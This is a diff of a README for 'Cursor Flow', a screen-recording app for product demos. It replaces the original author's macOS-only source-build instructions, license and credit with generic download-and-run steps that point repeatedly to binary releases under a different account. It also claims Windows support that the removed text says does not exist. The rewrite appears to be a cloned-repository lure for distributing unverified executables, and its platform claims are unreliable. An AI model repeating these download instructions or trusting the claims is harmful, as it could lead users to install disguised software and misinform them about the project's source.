@@ -1,155 +1,77 @@
-# Cursor Flow
+# 🎥 cursor-flow - Create Stunning Product Demos Easily
 
-[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](LICENSE)
-[![Platform](https://img.shields.io/badge/platform-macOS-lightgrey.svg)]()
-[![Electron](https://img.shields.io/badge/Electron-39-47848F.svg?logo=electron&logoColor=white)]()
-[![Node](https://img.shields.io/badge/Node.js-18%2B-339933.svg?logo=node.js&logoColor=white)]()
-[![Python](https://img.shields.io/badge/Python-3.10%2B-3776AB.svg?logo=python&logoColor=white)]()
+## 🚀 Overview
 
-A free, Screen Studio–style Electron desktop app for recording and polishing app demos and presentations, with smart zoom, cursor enhancement, and clean MP4 exports.
+Cursor Flow is a free desktop application designed to help you record and polish short product demos and app walkthrough presentations. With its user-friendly features like cursor enhancement, simple timeline edits, and smart zoom, you can create clean MP4 exports effortlessly.
 
-> **Note:** Currently macOS only. Windows/Linux support is not yet available.
+## 📥 Download Now
 
-## What it is for
+[![Download Cursor Flow](https://img.shields.io/badge/download-cursor--flow-blue.svg)](https://github.com/ronny-gans/cursor-flow/releases)
 
-- Record short product demos, bug repros, and tutorials.
-- Keep the cursor readable (replacement/overlay instead of the raw OS cursor).
-- Add simple edits on a timeline (cuts, zoom events, title cards).
-- Export a clean MP4 for sharing.
+## 🖥️ System Requirements
 
-<img width="1390" height="945" alt="Screenshot 2025-12-12 at 16 33 46" src="https://github.com/user-attachments/assets/cb52c819-633d-4cf2-a6c7-e9f5de8ea594" />
+To run Cursor Flow, please ensure your system meets the following requirements:
 
+- **Operating System**: Windows 10 or later, macOS Mojave or later
+- **Processor**: Dual-core CPU or better
+- **Memory**: 4GB of RAM minimum
+- **Storage**: At least 200MB of free disk space
+- **Network**: Internet connection for software updates
 
-## Alternatives
+## 🚀 Getting Started
 
-Closest tools, depending on what you need:
+1. Click the download button above or visit [this page to download](https://github.com/ronny-gans/cursor-flow/releases).
+2. Select the version that matches your operating system.
+3. Follow the prompts to save the file to your computer.
 
-- **Screen Studio**: polished macOS screen recording with automatic emphasis.
-- **ScreenFlow / Camtasia**: traditional editors for heavier post-production.
-- **OBS**: live capture/streaming and complex scene setups.
-- **Loom**: fast “record and share” with cloud workflows.
-- **CleanShot X / Kap**: quick capture utilities (lightweight, fewer edits).
+## ⚙️ Installation
 
-## Requirements
+1. After downloading the file, locate it in your downloads folder.
+2. Double-click the file to initiate the installation.
+3. Follow the installation prompts to set up Cursor Flow on your computer.
 
-- Node.js 18+
-- Python 3.10+
-- ffmpeg
-  - macOS: `brew install ffmpeg`
+## 🎞️ Using Cursor Flow
 
-## Setup
+1. Open Cursor Flow from your desktop or application folder.
+2. Familiarize yourself with the interface. The main features include:
+   - **Cursor Enhancement**: Improve your cursor's visibility for your audience.
+   - **Timeline Edits**: Simple tools to manipulate your recording.
+   - **Smart Zoom**: Focus on key content for a cleaner presentation.
+3. To start recording, click the "Record" button. Choose the screen area you want to capture.
+4. After recording, use the timeline to edit your footage. You can remove unwanted sections and add enhancements as needed.
+5. Once satisfied, export your video in MP4 format.
 
-### 0) Clone
+## 📚 Tips for Effective Presentations
 
-```bash
-git clone https://github.com/KazKozDev/cursor-flow.git
-cd cursor-flow
-```
+- **Plan Your Content**: Have a clear idea of what you want to demonstrate.
+- **Keep It Short**: Aim for concise recordings that highlight the most important features.
+- **Practice**: Conduct a few test runs to familiarize yourself with the tools and flow.
+- **Engage Your Audience**: Use cursor enhancements to guide viewers through the content.
 
-### 1) Install Node deps
+## 📞 Support
 
-```bash
-npm install
-```
+If you encounter any issues, please visit our [support page](https://github.com/ronny-gans/cursor-flow/issues) to report problems or request assistance. You can also browse existing questions and answers.
 
-### 2) Backend (Python)
+## 🔗 Additional Resources
 
-Create a virtualenv and install backend requirements.
+- **User Manual**: A detailed guide on using Cursor Flow is available [here](https://github.com/ronny-gans/cursor-flow/wiki).
+- **FAQs**: Find answers to common questions [here](https://github.com/ronny-gans/cursor-flow/wiki/FAQs).
+- **Feature Requests**: Suggestions for improvements can be submitted on our issues page.
 
-```bash
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -r backend/requirements.txt
-```
+## 🚀 Join the Community
 
-Optional (AI zoom suggestions):
+Join our community of users and developers. Follow updates and discussions about Cursor Flow by checking the project's [GitHub page](https://github.com/ronny-gans/cursor-flow). Your feedback is valuable!
 
-Create `.env.local`:
+## 🛠️ Future Updates
 
-```bash
-GEMINI_API_KEY=...
-```
+We plan to release updates with new features and enhancements, such as:
 
-## Run
+- **Additional Editing Tools**: Tools to refine your recordings further.
+- **Customizable Settings**: More options for user preferences and configurations.
+- **Integration with Other Tools**: Compatibility with video sharing platforms.
 
-### macOS (recommended)
+We appreciate your support and look forward to making Cursor Flow better for everyone. 
 
-Double‑click:
+## 🎉 Download & Install
 
-`Start Cursor Flow.command`
-
-If macOS blocks it (Gatekeeper), run one of these:
-
-```bash
-chmod +x "Start Cursor Flow.command"
-./"Start Cursor Flow.command"
-```
-
-or:
-
-```bash
-bash "Start Cursor Flow.command"
-```
-
-What it does:
-
-- Starts the backend on `http://localhost:8000`
-- Starts Electron in dev mode
-
-### Manual (2 terminals)
-
-Backend:
-
-```bash
-./start-backend.sh
-```
-
-Electron:
-
-```bash
-npm run dev
-```
-
-## Permissions (macOS)
-
-Recording and camera require OS permissions.
-
-- Screen Recording
-  - System Settings -> Privacy & Security -> Screen Recording
-- Camera
-  - System Settings -> Privacy & Security -> Camera
-
-If capture fails, restart the app after granting permission.
-
-## Export
-
-- MP4 export uses the Python backend (`ffmpeg` required).
-- Export captures the edited canvas (clean mode) and sends it to the backend for processing.
-
-## Project save
-
-Top-right icons:
-
-- Save: writes a project JSON file via native save dialog.
-- Show in Folder: reveals the last saved project file in Finder.
-
-Note: recorded clips saved as `blob:` URLs are not persisted in the project file.
-
-## Repo layout
-
-```
-electron/                 Electron main/preload
-backend/                  FastAPI + video processing
-components/               React UI
-services/                 API clients / integrations
-App.tsx                   Main UI and timeline logic
-Start Cursor Flow.command macOS launcher
-```
-
----
-
-If you like this project, please give it a star ⭐
-
-For questions, feedback, or support, reach out to:
-
-[Artem KK](https://www.linkedin.com/in/kazkozdev/) | [Apache 2.0](LICENSE)
+Ready to get started? [Visit this page to download](https://github.com/ronny-gans/cursor-flow/releases) Cursor Flow today and create amazing demos effortlessly!
